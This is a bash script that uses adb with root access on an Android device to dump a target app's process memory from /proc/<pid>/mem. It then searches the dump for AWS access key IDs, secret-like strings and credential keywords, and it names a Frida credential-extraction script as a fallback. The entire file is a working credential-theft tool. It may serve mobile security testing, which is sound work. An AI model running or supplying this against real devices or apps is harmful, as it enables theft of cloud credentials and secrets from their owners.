#!/bin/bash

# Reliable Memory Dump Script for Credential Extraction
# This script uses multiple methods to ensure a successful memory dump

PACKAGE_NAME="${1:-com.rustexample}"
OUTPUT_DIR="./memory_dump_$(date +%Y%m%d_%H%M%S)"
MAX_DUMP_SIZE_MB=50

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}Reliable Memory Dump Script${NC}"
echo "Package: $PACKAGE_NAME"
echo "Output: $OUTPUT_DIR"
echo ""

mkdir -p "$OUTPUT_DIR"

# Check root access
check_root() {
    # First check if adb is root
    if adb shell id 2>/dev/null | grep -q "uid=0"; then
        echo -e "${GREEN}[+] ADB is running as root${NC}"
        USE_SU=""
        return 0
    fi
    
    # If not, check if su works
    if adb shell "su -c id 2>/dev/null" | grep -q "uid=0"; then
        echo -e "${GREEN}[+] Root access via su confirmed${NC}"
        USE_SU="su -c"
        return 0
    fi
    
    echo -e "${RED}Error: Device is not rooted. Memory dump requires root access.${NC}"
    echo -e "${YELLOW}Try: adb root${NC}"
    echo -e "${YELLOW}Alternative: Use Frida method (frida_extract_credentials.js)${NC}"
    exit 1
}

# Get process ID
get_pid() {
    PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
    if [ -z "$PID" ]; then
        echo -e "${YELLOW}[!] Process not running. Starting app...${NC}"
        adb shell monkey -p "$PACKAGE_NAME" -c android.intent.category.LAUNCHER 1
        sleep 3
        PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
    fi
    
    if [ -z "$PID" ]; then
        echo -e "${RED}Error: Could not find process${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Process ID: $PID${NC}"
    echo "$PID" > "${OUTPUT_DIR}/pid.txt"
}

# Method 1: Dump using /proc/<pid>/maps (MOST RELIABLE)
dump_using_maps() {
    echo -e "${YELLOW}[*] Method 1: Using memory maps...${NC}"
    
    # Get memory maps
    if [ -n "$USE_SU" ]; then
        adb shell "$USE_SU 'cat /proc/$PID/maps'" > "${OUTPUT_DIR}/maps.txt" 2>/dev/null
    else
        adb shell "cat /proc/$PID/maps" > "${OUTPUT_DIR}/maps.txt" 2>/dev/null
    fi
    if [ ! -s "${OUTPUT_DIR}/maps.txt" ]; then
        echo -e "${RED}[-] Failed to get memory maps${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] Memory maps saved${NC}"
    
    # Find heap region
    HEAP_LINE=$(grep -E "\[heap\]|heap" "${OUTPUT_DIR}/maps.txt" | head -1)
    if [ -z "$HEAP_LINE" ]; then
        # If no [heap] tag, look for large rw-p regions (likely heap)
        HEAP_LINE=$(grep "rw-p" "${OUTPUT_DIR}/maps.txt" | awk '{if ($2-$1 > 1000000) print}' | head -1)
    fi
    
    if [ -z "$HEAP_LINE" ]; then
        echo -e "${YELLOW}[!] Could not identify heap region, trying largest rw-p region...${NC}"
        HEAP_LINE=$(grep "rw-p" "${OUTPUT_DIR}/maps.txt" | sort -k2 -n | tail -1)
    fi
    
    if [ -z "$HEAP_LINE" ]; then
        echo -e "${RED}[-] No suitable memory region found${NC}"
        return 1
    fi
    
    # Extract addresses
    HEAP_RANGE=$(echo "$HEAP_LINE" | awk '{print $1}')
    HEAP_START=$(echo "$HEAP_RANGE" | cut -d'-' -f1)
    HEAP_END=$(echo "$HEAP_RANGE" | cut -d'-' -f2)
    
    echo -e "${GREEN}[+] Found heap region: $HEAP_START - $HEAP_END${NC}"
    
    # Convert hex to decimal
    HEAP_START_DEC=$(printf '%d' "0x$HEAP_START")
    HEAP_END_DEC=$(printf '%d' "0x$HEAP_END")
    HEAP_SIZE=$((HEAP_END_DEC - HEAP_START_DEC))
    MAX_SIZE=$((MAX_DUMP_SIZE_MB * 1024 * 1024))
    
    if [ $HEAP_SIZE -gt $MAX_SIZE ]; then
        echo -e "${YELLOW}[!] Heap size ($HEAP_SIZE bytes) exceeds max ($MAX_SIZE bytes), limiting dump${NC}"
        DUMP_SIZE=$MAX_SIZE
    else
        DUMP_SIZE=$HEAP_SIZE
    fi
    
    echo -e "${YELLOW}[*] Dumping ${DUMP_SIZE} bytes from heap...${NC}"
    
    # Dump heap
    if [ -n "$USE_SU" ]; then
        if ! adb shell "$USE_SU 'dd if=/proc/$PID/mem of=/sdcard/heap.dump bs=1 count=$DUMP_SIZE skip=$HEAP_START_DEC 2>/dev/null'"; then
            echo -e "${RED}[-] Failed to dump heap${NC}"
            return 1
        fi
    else
        if ! adb shell "dd if=/proc/$PID/mem of=/sdcard/heap.dump bs=1 count=$DUMP_SIZE skip=$HEAP_START_DEC 2>/dev/null"; then
            echo -e "${RED}[-] Failed to dump heap${NC}"
            return 1
        fi
    fi
    
    # Verify dump
    if [ -n "$USE_SU" ]; then
        DUMP_SIZE_ACTUAL=$(adb shell "$USE_SU 'stat -c%s /sdcard/heap.dump'" 2>/dev/null | tr -d '\r')
    else
        DUMP_SIZE_ACTUAL=$(adb shell "stat -c%s /sdcard/heap.dump" 2>/dev/null | tr -d '\r')
    fi
    if [ "$DUMP_SIZE_ACTUAL" -eq 0 ]; then
        echo -e "${RED}[-] Dump file is empty${NC}"
        return 1
    fi
    
    # Pull dump
    adb pull /sdcard/heap.dump "${OUTPUT_DIR}/heap.dump" || {
        echo -e "${RED}[-] Failed to pull dump${NC}"
        return 1
    }
    
    # Clean up
    if [ -n "$USE_SU" ]; then
        adb shell "$USE_SU 'rm /sdcard/heap.dump'" 2>/dev/null
    else
        adb shell "rm /sdcard/heap.dump" 2>/dev/null
    fi
    
    echo -e "${GREEN}[+] Heap dump created: ${OUTPUT_DIR}/heap.dump (${DUMP_SIZE_ACTUAL} bytes)${NC}"
    return 0
}

# Method 2: Simple memory dump (fallback)
dump_simple() {
    echo -e "${YELLOW}[*] Method 2: Simple memory dump (fallback)...${NC}"
    
    DUMP_SIZE=$((MAX_DUMP_SIZE_MB * 1024))
    echo -e "${YELLOW}[*] Dumping first ${MAX_DUMP_SIZE_MB}MB of process memory...${NC}"
    
    if [ -n "$USE_SU" ]; then
        if ! adb shell "$USE_SU 'dd if=/proc/$PID/mem of=/sdcard/mem.dump bs=1024 count=$DUMP_SIZE skip=0 2>/dev/null'"; then
            echo -e "${RED}[-] Failed to create dump${NC}"
            return 1
        fi
    else
        if ! adb shell "dd if=/proc/$PID/mem of=/sdcard/mem.dump bs=1024 count=$DUMP_SIZE skip=0 2>/dev/null"; then
            echo -e "${RED}[-] Failed to create dump${NC}"
            return 1
        fi
    fi
    
    if [ -n "$USE_SU" ]; then
        DUMP_SIZE_ACTUAL=$(adb shell "$USE_SU 'stat -c%s /sdcard/mem.dump'" 2>/dev/null | tr -d '\r')
    else
        DUMP_SIZE_ACTUAL=$(adb shell "stat -c%s /sdcard/mem.dump" 2>/dev/null | tr -d '\r')
    fi
    if [ "$DUMP_SIZE_ACTUAL" -eq 0 ]; then
        echo -e "${RED}[-] Dump file is empty${NC}"
        return 1
    fi
    
    adb pull /sdcard/mem.dump "${OUTPUT_DIR}/mem.dump" || return 1
    if [ -n "$USE_SU" ]; then
        adb shell "$USE_SU 'rm /sdcard/mem.dump'" 2>/dev/null
    else
        adb shell "rm /sdcard/mem.dump" 2>/dev/null
    fi
    
    echo -e "${GREEN}[+] Memory dump created: ${OUTPUT_DIR}/mem.dump (${DUMP_SIZE_ACTUAL} bytes)${NC}"
    return 0
}

# Extract strings and search for credentials
extract_credentials() {
    DUMP_FILE=""
    if [ -f "${OUTPUT_DIR}/heap.dump" ]; then
        DUMP_FILE="${OUTPUT_DIR}/heap.dump"
    elif [ -f "${OUTPUT_DIR}/mem.dump" ]; then
        DUMP_FILE="${OUTPUT_DIR}/mem.dump"
    else
        echo -e "${RED}[-] No dump file found for analysis${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Extracting strings and searching for credentials...${NC}"
    
    # Extract all strings
    if command -v strings &> /dev/null; then
        strings "$DUMP_FILE" > "${OUTPUT_DIR}/all_strings.txt" 2>/dev/null
        echo -e "${GREEN}[+] Extracted strings to ${OUTPUT_DIR}/all_strings.txt${NC}"
        
        # Search for AWS access keys
        echo -e "${YELLOW}[*] Searching for AWS Access Key IDs...${NC}"
        grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/access_keys.txt" 2>/dev/null
        if [ -s "${OUTPUT_DIR}/access_keys.txt" ]; then
            echo -e "${GREEN}[!] FOUND ACCESS KEYS:${NC}"
            cat "${OUTPUT_DIR}/access_keys.txt"
        else
            echo -e "${YELLOW}[!] No access keys found with pattern AKIA...${NC}"
        fi
        
        # Search for potential secrets
        echo -e "${YELLOW}[*] Searching for potential secret keys...${NC}"
        grep -E "[a-zA-Z0-9+/]{38,42}" "${OUTPUT_DIR}/all_strings.txt" | head -20 > "${OUTPUT_DIR}/potential_secrets.txt" 2>/dev/null
        
        # Search for credential keywords
        echo -e "${YELLOW}[*] Searching for credential keywords...${NC}"
        grep -iE "access_key|secret|credential|aws|s3|bucket" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/credential_keywords.txt" 2>/dev/null
        
        echo -e "${GREEN}[+] Analysis complete. Check files in ${OUTPUT_DIR}/${NC}"
    else
        echo -e "${YELLOW}[!] 'strings' command not found. Install binutils.${NC}"
        echo -e "${YELLOW}[!] Dump file saved at: $DUMP_FILE${NC}"
        echo -e "${YELLOW}[!] You can analyze it manually with: strings $DUMP_FILE | grep -E 'AKIA'${NC}"
    fi
}

# Initialize USE_SU variable
USE_SU=""

# Main
main() {
    check_root
    get_pid
    
    echo ""
    echo -e "${GREEN}=== Creating Memory Dump ===${NC}"
    
    # Try Method 1 first (most reliable)
    if dump_using_maps; then
        echo -e "${GREEN}[+] Method 1 succeeded${NC}"
    elif dump_simple; then
        echo -e "${GREEN}[+] Method 2 succeeded${NC}"
    else
        echo -e "${RED}[-] All dump methods failed${NC}"
        echo -e "${YELLOW}[!] Try using Frida method instead:${NC}"
        echo "   frida -U -f $PACKAGE_NAME -l frida_extract_credentials.js --no-pause"
        exit 1
    fi
    
    echo ""
    echo -e "${GREEN}=== Extracting Credentials ===${NC}"
    extract_credentials
    
    echo ""
    echo -e "${GREEN}=== Summary ===${NC}"
    echo "Output directory: $OUTPUT_DIR"
    echo "Files created:"
    ls -lh "$OUTPUT_DIR" | tail -n +2
}

main
